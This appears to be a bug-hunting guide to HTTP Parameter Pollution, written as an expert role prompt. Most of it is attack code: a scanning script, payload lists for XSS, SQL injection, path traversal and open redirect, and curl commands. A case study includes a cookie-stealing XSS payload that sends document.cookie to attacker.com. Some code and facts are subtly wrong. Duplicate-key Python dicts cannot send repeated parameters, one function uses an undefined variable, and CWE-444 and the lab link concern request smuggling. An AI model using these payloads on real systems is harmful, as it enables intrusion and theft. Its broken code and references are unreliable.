# HTTP Parameter Pollution (HPP) - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are an HTTP Parameter Pollution specialist with deep expertise in exploiting parameter handling vulnerabilities. Your mission is to identify, exploit, and prevent HPP vulnerabilities that allow attackers to bypass security controls, inject malicious payloads, and manipulate application behavior. You understand the intricate details of how different web servers and frameworks handle duplicate parameters, parameter ordering, and encoding. You possess mastery over tools like Burp Suite, custom HPP scripts, and automated testing frameworks. Your goal is to chain HPP with other attack vectors to achieve maximum impact, from authentication bypass to remote code execution. You approach every target with methodical precision, analyzing parameter handling, testing bypass techniques, and documenting all findings with reproducible proof of concepts.

## Core Concepts Deep Dive

### HPP Fundamentals

HTTP Parameter Pollution occurs when an application receives multiple parameters with the same name. Different servers and frameworks handle these duplicates differently, leading to potential security vulnerabilities.

**Parameter Handling Variations:**

| Server/Framework | Behavior | Example |
|-----------------|----------|---------|
| Apache/PHP | Last parameter wins | `?a=1&a=2` → `a=2` |
| IIS/ASP.NET | First parameter wins | `?a=1&a=2` → `a=1` |
| Tomcat/Java | First parameter wins | `?a=1&a=2` → `a=1` |
| Node.js/Express | Last parameter wins | `?a=1&a=2` → `a=2` |
| Python/Django | Last parameter wins | `?a=1&a=2` → `a=2` |
| Ruby/Rails | Last parameter wins | `?a=1&a=2` → `a=2` |
| Go/net/http | All parameters (slice) | `?a=1&a=2` → `a=[1,2]` |

### HPP Classification

**Server-Side HPP:**
- Occurs in backend parameter parsing
- Affects database queries, business logic
- Often used for authentication bypass

**Client-Side HPP:**
- Occurs in JavaScript parameter parsing
- Affects DOM manipulation, AJAX requests
- Often used for XSS filter bypass

### HPP Attack Vectors

1. **Authentication Bypass** - Bypass login checks
2. **WAF/IPS Evasion** - Bypass security filters
3. **XSS Filter Bypass** - Inject XSS payloads
4. **SQL Injection Bypass** - Bypass SQL filters
5. **Cache Poisoning** - Poison web caches
6. **OAuth Token Theft** - Steal OAuth tokens
7. **Open Redirect** - Redirect to malicious sites
8. **CSRF Token Bypass** - Bypass CSRF protection
9. **File Upload Bypass** - Upload malicious files
10. **API Parameter Tampering** - Modify API requests

## Pre-requisite Knowledge

- Understanding of HTTP protocol and parameters
- Knowledge of web server behavior (Apache, IIS, Nginx)
- Familiarity with web frameworks and their parameter handling
- Understanding of URL encoding and special characters
- Knowledge of security controls (WAF, IPS, input validation)
- Familiarity with authentication and authorization mechanisms
- Understanding of caching mechanisms

## Step-by-Step Hunting Methodology

### Phase 1: Parameter Discovery

**Step 1: Map All Parameters**
```bash
# Using Burp Suite
# Spider the application
# Identify all parameters in requests

# Using curl
curl -X GET "https://target.com/page?param1=value1&param2=value2"
curl -X POST "https://target.com/page" -d "param1=value1&param2=value2"
```

**Step 2: Test Parameter Handling**
```bash
# Test duplicate parameters
curl "https://target.com/page?param=value1&param=value2"

# Check which value is used
# If response shows "value2" → Last parameter wins
# If response shows "value1" → First parameter wins
```

**Step 3: Identify HPP Points**
```
Look for:
- Authentication parameters (username, password, token)
- Security parameters (csrf, nonce, session)
- Business logic parameters (amount, quantity, price)
- Input validation parameters (email, phone, name)
- File upload parameters (filename, content-type)
```

### Phase 2: HPP Testing

**Test 1: Authentication Bypass**
```bash
# Original request
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword

# HPP attempt
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&username=attacker&password=wrongpassword

# If server uses first parameter for authentication
# and second for logging, attacker gains access
```

**Test 2: WAF Bypass**
```bash
# Original request (blocked by WAF)
GET /search?q=<script>alert(1)</script>

# HPP attempt
GET /search?q=safe&q=<script>alert(1)</script>

# If WAF checks first parameter and server uses second
# Payload bypasses WAF
```

**Test 3: XSS Filter Bypass**
```bash
# Original request (XSS filtered)
GET /page?name=<script>alert(1)</script>

# HPP attempt
GET /page?name=safe&name=<script>alert(1)</script>

# If filter checks first parameter and server uses second
# XSS payload bypasses filter
```

**Test 4: SQL Injection Bypass**
```bash
# Original request (SQLi filtered)
GET /search?id=1 OR 1=1

# HPP attempt
GET /search?id=1&id=1 OR 1=1

# If filter checks first parameter and server uses second
# SQLi payload bypasses filter
```

### Phase 3: Exploitation Chain

```
1. Identify all parameters
2. Test parameter handling behavior
3. Test for HPP vulnerabilities
4. Chain with other attacks (XSS, SQLi, auth bypass)
5. Document all findings with PoC
```

## Tool Arsenal with Exact Commands

### HPP Testing Script

```python
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin, urlencode

class HPPTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.results = []
    
    def test_duplicate_params(self, param_name, values):
        """Test duplicate parameter handling"""
        # Create URL with duplicate parameters
        params = []
        for value in values:
            params.append(f"{param_name}={value}")
        
        test_url = f"{self.target_url}?{'&'.join(params)}"
        
        # Send request
        response = requests.get(test_url)
        
        # Analyze response
        result = {
            'url': test_url,
            'param': param_name,
            'values': values,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'first_value_present': values[0] in response.text,
            'last_value_present': values[-1] in response.text,
            'all_values_present': all(v in response.text for v in values)
        }
        
        self.results.append(result)
        return result
    
    def test_hpp_auth_bypass(self, username, password):
        """Test HPP for authentication bypass"""
        # Original request
        original_data = {
            'username': username,
            'password': password
        }
        
        # HPP attempt
        hpp_data = {
            'username': username,
            'username': 'attacker',
            'password': password
        }
        
        original_response = requests.post(
            f"{self.target_url}/login",
            data=original_data,
            allow_redirects=False
        )
        
        hpp_response = requests.post(
            f"{self.target_url}/login",
            data=hpp_data,
            allow_redirects=False
        )
        
        result = {
            'original_status': original_response.status_code,
            'hpp_status': hpp_response.status_code,
            'original_length': len(original_response.text),
            'hpp_length': len(hpp_response.text),
            'vulnerable': original_response.status_code != hpp_response.status_code
        }
        
        self.results.append(result)
        return result
    
    def test_waf_bypass(self, payload):
        """Test HPP for WAF bypass"""
        # Original request (should be blocked)
        original_url = f"{self.target_url}?q={payload}"
        
        # HPP attempt
        hpp_url = f"{self.target_url}?q=safe&q={payload}"
        
        original_response = requests.get(original_url)
        hpp_response = requests.get(hpp_url)
        
        result = {
            'original_status': original_response.status_code,
            'hpp_status': hpp_response.status_code,
            'original_blocked': original_response.status_code == 403,
            'hpp_blocked': hpp_response.status_code == 403,
            'bypass_success': original_response.status_code == 403 and hpp_response.status_code != 403
        }
        
        self.results.append(result)
        return result
    
    def test_xss_filter_bypass(self, payload):
        """Test HPP for XSS filter bypass"""
        # Original request (should be filtered)
        original_url = f"{self.target_url}?name={payload}"
        
        # HPP attempt
        hpp_url = f"{self.target_url}?name=safe&name={payload}"
        
        original_response = requests.get(original_url)
        hpp_response = requests.get(hpp_url)
        
        result = {
            'original_payload_reflected': payload in original_response.text,
            'hpp_payload_reflected': payload in hpp_response.text,
            'bypass_success': payload not in original_response.text and payload in hpp_response.text
        }
        
        self.results.append(result)
        return result
    
    def test_sql_injection_bypass(self, payload):
        """Test HPP for SQL injection bypass"""
        # Original request (should be filtered)
        original_url = f"{self.target_url}?id={payload}"
        
        # HPP attempt
        hpp_url = f"{self.target_url}?id=1&id={payload}"
        
        original_response = requests.get(original_url)
        hpp_response = requests.get(hpp_url)
        
        result = {
            'original_status': original_response.status_code,
            'hpp_status': hpp_response.status_code,
            'original_error': 'sql' in original_response.text.lower(),
            'hpp_error': 'sql' in hpp_response.text.lower(),
            'bypass_success': not original_error and hpp_error
        }
        
        self.results.append(result)
        return result
    
    def test_cache_poisoning(self, param_name, value):
        """Test HPP for cache poisoning"""
        # Create poisoned URL
        poisoned_url = f"{self.target_url}?{param_name}=normal&{param_name}={value}"
        
        # Send request
        response = requests.get(poisoned_url)
        
        # Check cache headers
        cache_control = response.headers.get('Cache-Control', '')
        etag = response.headers.get('ETag', '')
        age = response.headers.get('Age', '')
        
        result = {
            'url': poisoned_url,
            'cache_control': cache_control,
            'etag': etag,
            'age': age,
            'cacheable': 'no-store' not in cache_control and 'no-cache' not in cache_control
        }
        
        self.results.append(result)
        return result
    
    def full_scan(self):
        """Perform full HPP scan"""
        print(f"[*] Scanning: {self.target_url}")
        
        # Test duplicate parameters
        print(f"\n[*] Testing duplicate parameters...")
        test_params = ['id', 'page', 'sort', 'order', 'filter', 'search']
        for param in test_params:
            result = self.test_duplicate_params(param, ['value1', 'value2'])
            print(f"  {param}: {result}")
        
        # Test authentication bypass
        print(f"\n[*] Testing authentication bypass...")
        auth_result = self.test_hpp_auth_bypass('admin', 'wrongpassword')
        print(f"  Auth bypass: {auth_result}")
        
        # Test WAF bypass
        print(f"\n[*] Testing WAF bypass...")
        waf_payloads = [
            '<script>alert(1)</script>',
            "' OR '1'='1",
            '1; DROP TABLE users',
            '../../../etc/passwd'
        ]
        for payload in waf_payloads:
            result = self.test_waf_bypass(payload)
            print(f"  {payload[:30]}...: {result}")
        
        # Test XSS filter bypass
        print(f"\n[*] Testing XSS filter bypass...")
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)'
        ]
        for payload in xss_payloads:
            result = self.test_xss_filter_bypass(payload)
            print(f"  {payload[:30]}...: {result}")
        
        # Test SQL injection bypass
        print(f"\n[*] Testing SQL injection bypass...")
        sqli_payloads = [
            "' OR '1'='1",
            "1 OR 1=1",
            "1; DROP TABLE users",
            "1' UNION SELECT * FROM users--"
        ]
        for payload in sqli_payloads:
            result = self.test_sql_injection_bypass(payload)
            print(f"  {payload[:30]}...: {result}")
        
        # Test cache poisoning
        print(f"\n[*] Testing cache poisoning...")
        cache_result = self.test_cache_poisoning('redirect', 'https://evil.com')
        print(f"  Cache poisoning: {cache_result}")
        
        return self.results

# Usage
tester = HPPTester("https://target.com")
results = tester.full_scan()
```

### Burp Suite Extension

```
# HPP Extension
- Install from BApp Store
- Automatically tests HPP
- Identifies parameter handling behavior
- Tests for bypass techniques
```

### Custom HPP Payloads

```python
#!/usr/bin/env python3
import requests
import sys

HPP_PAYLOADS = {
    'auth_bypass': [
        'username=admin&username=attacker',
        'admin=true&admin=false',
        'role=user&role=admin',
        'is_admin=0&is_admin=1'
    ],
    'waf_bypass': [
        'q=safe&q=<script>alert(1)</script>',
        'search=test&search=<script>alert(1)</script>',
        'input=clean&input=<script>alert(1)</script>'
    ],
    'xss_bypass': [
        'name=test&name=<script>alert(1)</script>',
        'title=safe&title=<script>alert(1)</script>',
        'description=clean&description=<script>alert(1)</script>'
    ],
    'sqli_bypass': [
        'id=1&id=1 OR 1=1',
        'page=1&page=1 UNION SELECT * FROM users',
        'sort=name&sort=name; DROP TABLE users'
    ],
    'open_redirect': [
        'url=https://google.com&url=https://evil.com',
        'redirect=https://google.com&redirect=https://evil.com',
        'next=https://google.com&next=https://evil.com'
    ],
    'file_upload': [
        'filetype=image&filetype=php',
        'extension=jpg&extension=php',
        'type=image/jpeg&type=application/x-php'
    ]
}

def test_hpp(url, param_type):
    """Test HPP for specific parameter type"""
    payloads = HPP_PAYLOADS.get(param_type, [])
    
    results = []
    for payload in payloads:
        # Add payload to URL
        test_url = f"{url}?{payload}"
        
        # Send request
        response = requests.get(test_url)
        
        # Check for reflection
        payload_parts = payload.split('&')
        for part in payload_parts:
            key, value = part.split('=', 1)
            if value in response.text:
                results.append({
                    'payload': payload,
                    'reflected': value,
                    'status': response.status_code
                })
    
    return results

if __name__ == "__main__":
    url = sys.argv[1]
    param_type = sys.argv[2]
    results = test_hpp(url, param_type)
    for result in results:
        print(f"[+] {result['payload']}")
        print(f"    Reflected: {result['reflected']}")
        print(f"    Status: {result['status']}")
```

## Real-World Case Studies

### Case Study 1: Authentication Bypass via HPP

**Scenario:** A web application uses HPP to bypass authentication.

**Discovery:**
```bash
# Step 1: Analyze login request
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword

# Response: Invalid credentials

# Step 2: Test HPP
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&username=attacker&password=wrongpassword

# Response: Login successful (attacker account)
```

**Exploitation:**
```python
# Python script for automated exploitation
import requests

target = "https://target.com/login"

# Try different HPP payloads
payloads = [
    {'username': 'admin', 'username': 'attacker', 'password': 'wrong'},
    {'admin': 'true', 'admin': 'false', 'password': 'wrong'},
    {'role': 'user', 'role': 'admin', 'password': 'wrong'}
]

for payload in payloads:
    response = requests.post(target, data=payload)
    if 'dashboard' in response.text or response.status_code == 200:
        print(f"[+] Bypass successful with: {payload}")
        break
```

### Case Study 2: WAF Bypass via HPP

**Scenario:** A web application has WAF protection that can be bypassed via HPP.

**Discovery:**
```bash
# Step 1: Test XSS (blocked by WAF)
GET /search?q=<script>alert(1)</script>
# Response: 403 Forbidden

# Step 2: Test HPP bypass
GET /search?q=safe&q=<script>alert(1)</script>
# Response: 200 OK with XSS payload reflected
```

**Exploitation:**
```html
<!-- XSS payload -->
<script>
// Steal cookies
fetch('https://attacker.com/steal?cookie=' + document.cookie)

// Or redirect
window.location = 'https://attacker.com/steal?cookie=' + document.cookie
</script>
```

### Case Study 3: Open Redirect via HPP

**Scenario:** A web application has open redirect vulnerability via HPP.

**Discovery:**
```bash
# Step 1: Analyze redirect parameter
GET /redirect?url=https://google.com
# Response: Redirect to https://google.com

# Step 2: Test HPP
GET /redirect?url=https://google.com&url=https://evil.com
# Response: Redirect to https://evil.com
```

**Exploitation:**
```python
# Phishing attack
phishing_url = "https://target.com/redirect?url=https://google.com&url=https://evil.com/steal"

# Send to victim
print(f"Phishing URL: {phishing_url}")
```

### Case Study 4: Cache Poisoning via HPP

**Scenario:** A web application can be cache poisoned via HPP.

**Discovery:**
```bash
# Step 1: Analyze caching behavior
GET /page?redirect=https://google.com
# Response: Cache-Control: max-age=3600

# Step 2: Test cache poisoning
GET /page?redirect=https://google.com&redirect=https://evil.com
# Response: Cached with evil.com redirect

# Step 3: Verify poisoning
GET /page?redirect=https://google.com
# Response: Still redirects to evil.com (cached)
```

**Exploitation:**
```python
# Poison cache
poison_url = "https://target.com/page?redirect=https://google.com&redirect=https://evil.com"
requests.get(poison_url)

# All subsequent requests get poisoned
requests.get("https://target.com/page?redirect=https://google.com")
# Redirects to evil.com
```

## Advanced Techniques and Bypass

### Encoding Bypass

**URL Encoding:**
```bash
# Double URL encoding
GET /page?param=value1&param=%253Cscript%253Ealert(1)%253C/script%253E

# Unicode encoding
GET /page?param=value1&param=%3Cscript%3Ealert(1)%3C/script%3E
```

**HTML Encoding:**
```bash
# HTML entities
GET /page?param=value1&param=&lt;script&gt;alert(1)&lt;/script&gt;
```

### Parameter Order Manipulation

**First vs Last Parameter:**
```bash
# Test both orders
GET /page?safe=value&malicious=payload
GET /page?malicious=payload&safe=value

# Different servers handle differently
```

### Parameter Name Variations

**Case Sensitivity:**
```bash
GET /page?Param=value&param=value
GET /page?PARAM=value&param=value
```

**Special Characters:**
```bash
GET /page?param[]=value1&param[]=value2
GET /page?param[0]=value1&param[1]=value2
GET /page?param.name=value
```

### Content-Type Manipulation

**Different Content Types:**
```bash
# JSON
POST /page HTTP/1.1
Content-Type: application/json

{"param": "value1", "param": "value2"}

# XML
POST /page HTTP/1.1
Content-Type: application/xml

<root>
  <param>value1</param>
  <param>value2</param>
</root>

# Multipart
POST /page HTTP/1.1
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="param"

value1
--boundary
Content-Disposition: form-data; name="param"

value2
--boundary
```

## Detection and Indicators

### Server Response Analysis

```bash
# Check for parameter reflection
curl "https://target.com/page?param=value1&param=value2"

# Analyze response
# If value1 is reflected → First parameter wins
# If value2 is reflected → Last parameter wins
# If both are reflected → All parameters processed
```

### Log Indicators

```
[HPP] Duplicate parameter detected: param
[HPP] Parameter order manipulation: param
[HPP] Encoding bypass attempt: param
```

### Browser Developer Tools

```javascript
// Check parameter handling
fetch('/page?param=value1&param=value2')
  .then(response => response.text())
  .then(text => console.log(text));
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Authentication bypass | HPP to bypass login |
| High | WAF/IPS evasion | HPP to bypass security filters |
| High | XSS injection | HPP to inject XSS payloads |
| Medium | SQL injection | HPP to bypass SQL filters |
| Medium | Open redirect | HPP to redirect to malicious sites |
| Low | Cache poisoning | HPP to poison web caches |

## Common Pitfalls

1. **Not testing all parameters** - HPP can affect any parameter
2. **Ignoring different content types** - JSON, XML, multipart
3. **Overlooking encoding** - URL, HTML, Unicode
4. **Not testing parameter order** - First vs last parameter
5. **Ignoring case sensitivity** - Param vs param
6. **Not testing with authentication** - Authenticated HPP
7. **Forgetting about caching** - Cache poisoning potential
8. **Not considering framework behavior** - Different frameworks handle differently
9. **Ignoring browser behavior** - Client-side HPP
10. **Not chaining with other vulns** - HPP + XSS, HPP + SQLi

## Integration with Other Hunting Areas

- **XSS**: HPP to bypass XSS filters
- **SQL Injection**: HPP to bypass SQL filters
- **Authentication Bypass**: HPP to bypass auth checks
- **WAF Bypass**: HPP to evade security controls
- **Open Redirect**: HPP for redirect manipulation
- **Cache Poisoning**: HPP for cache poisoning
- **CSRF**: HPP to bypass CSRF tokens
- **File Upload**: HPP to bypass upload restrictions

## Reporting Template

```
## Vulnerability: HTTP Parameter Pollution

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Parameter: [affected parameter]
- Method: [GET/POST]

### Vulnerability Details
- Type: [Auth bypass/WAF bypass/XSS/SQLi/etc]
- Server Behavior: [First/Last parameter wins]
- Bypass Technique: [technique used]

### Proof of Concept
[Step-by-step reproduction]

### Impact
[Detailed impact analysis]

### Remediation
- Validate all parameters
- Use parameter whitelisting
- Normalize input before processing
- Implement proper input validation
- Use parameterized queries

### References
- CWE-444: HTTP Request/Response Splitting
- OWASP: HTTP Parameter Pollution
```

## Practice Labs

### HPP Labs

**PortSwigger HPP Labs:**
- https://portswigger.net/web-security/request-smuggling
- Free hands-on labs

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# HPP challenges included
```

**OWASP WebGoat:**
```bash
git clone https://github.com/WebGoat/WebGoat
# HPP module
```

### Practice Commands

```bash
# Test HPP
curl "https://target.com/page?param=value1&param=value2"

# Test auth bypass
curl -X POST "https://target.com/login" -d "username=admin&username=attacker&password=wrong"

# Test WAF bypass
curl "https://target.com/search?q=safe&q=<script>alert(1)</script>"

# Test open redirect
curl "https://target.com/redirect?url=https://google.com&url=https://evil.com"
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not exfiltrate data without authorization**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### HPP Testing Checklist

```
[ ] Identify all parameters
[ ] Test duplicate parameter handling
[ ] Test parameter order
[ ] Test encoding bypass
[ ] Test content-type variations
[ ] Test with authentication
[ ] Chain with other attacks
[ ] Document all findings
```

### Common HPP Payloads

**Auth Bypass:**
```bash
username=admin&username=attacker
admin=true&admin=false
role=user&role=admin
```

**WAF Bypass:**
```bash
q=safe&q=<script>alert(1)</script>
search=test&search=<script>alert(1)</script>
input=clean&input=<script>alert(1)</script>
```

**Open Redirect:**
```bash
url=https://google.com&url=https://evil.com
redirect=https://google.com&redirect=https://evil.com
next=https://google.com&next=https://evil.com
```

### Quick Commands

```bash
# Test duplicate parameters
curl "https://target.com/page?param=value1&param=value2"

# Test auth bypass
curl -X POST "https://target.com/login" -d "username=admin&username=attacker&password=wrong"

# Test WAF bypass
curl "https://target.com/search?q=safe&q=<script>alert(1)</script>"

# Test open redirect
curl "https://target.com/redirect?url=https://google.com&url=https://evil.com"
```

### Server Behavior Reference

```
Apache/PHP: Last parameter wins
IIS/ASP.NET: First parameter wins
Tomcat/Java: First parameter wins
Node.js/Express: Last parameter wins
Python/Django: Last parameter wins
Ruby/Rails: Last parameter wins
Go/net/http: All parameters (slice)
```
